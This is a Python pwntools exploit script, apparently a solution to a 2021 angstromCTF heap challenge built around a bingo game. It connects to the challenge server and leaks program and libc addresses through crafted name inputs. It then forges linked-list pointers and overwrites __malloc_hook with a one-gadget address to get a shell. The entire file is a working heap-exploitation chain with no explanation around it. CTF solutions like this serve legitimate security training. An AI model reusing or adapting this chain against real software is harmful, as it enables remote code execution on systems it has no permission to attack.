from pwn import *
context.log_level = 'info'
context.arch = 'amd64'

host, port = "pwn.2021.chall.actf.co", "21840"
libc = ELF('./libc.so.6')

p = remote(host, port)

marker = "X"

def mark_slot(x, y):
    p.sendlineafter('Choice: ', '1')
    p.sendlineafter('space: ', '%d %d' % (x, y))

def view(x, y):
    p.sendlineafter('Choice: ', '2')
    p.sendlineafter('space: ', '%d %d' % (x, y))

def reset(index, rc):
    p.sendlineafter('Choice: ', '3')
    p.sendlineafter('reset: ', str(index))
    p.sendlineafter('olumn: ', rc)

def check_specific(index, rc):
    p.sendlineafter('Choice: ', '4')
    p.sendlineafter('check: ', str(index))
    p.sendlineafter('olumn: ', rc)

def check_bingos(delete=True, namelen=0, name=""):
    p.sendlineafter('Choice: ',  '5')
    res = p.recvline()

    if "bingo" in res:
        p.sendlineafter('? ', 'y' if delete else 'n')
        p.sendlineafter('name: ', str(namelen))
        p.sendafter('Name: ', name)

def change_marker(marker):
    p.sendlineafter('Choice: ', '6')
    p.sendafter('marker: ', marker)    

# set last column
p.sendlineafter('now: ', marker)
for i in range(5):
    mark_slot(4, i)

# first we leak a prog address to calculate prog_base
check_bingos(True, 0x20, 'p'*0x17+'q')
p.recvuntil('pq', drop=True)
prog_base = u64(p.recvuntil('!\n', drop=True).ljust(8,'\x00')) - 0x3230
log.success('prog leak: %s' % hex(prog_base))

# set another column (second from right to left)
for i in range(5):
   mark_slot(3, i)

# create false linked list entry pointing to .got libc entry, and with linked list pointer pointing to root
check_bingos(True, 0x20, p64(prog_base) + p64(0xdeadbeef) + p64(prog_base+0x5130) + p64(prog_base+0x4f80))

# leak the libc .got entry to calculate libc base
view(3,2)
p.readuntil(': ')
libc.address = u64(p.recvuntil('\n', drop=True).ljust(8,'\x00')) - 0x875a0
log.success('libc base: %s' % hex(libc.address))

# create fake linked list pointers (pointing to __malloc_hook) in marker & set root to marker
change_marker(p64(prog_base+0x5140) + p64(libc.symbols['__malloc_hook']) + p64(0xdeadbeef))
mark_slot(3, 3)

# change marker to one gadget address
onegadget = [0xe6c7e, 0xe6c81, 0xe6c84]
change_marker(p64(libc.address + onegadget[1]))
# write it to __malloc_hook
mark_slot(1,0)

# next malloc will give us SHELL
reset(0,'c')

p.interactive()
